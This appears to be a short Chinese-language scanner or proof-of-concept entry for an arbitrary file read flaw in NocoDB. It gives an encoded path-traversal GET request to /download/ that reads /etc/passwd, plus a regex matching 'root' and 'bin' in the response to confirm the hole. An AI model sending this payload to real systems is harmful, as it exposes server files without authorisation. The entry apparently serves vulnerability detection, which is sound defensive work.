# NocoDB任意文件读取漏洞

NocoDB ｜ 任意文件读取/写入 ｜ —
- **请求**：`GET /download/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1`
- **响应特征**：200 ^(?=.*?root)(?=.*?bin).*?$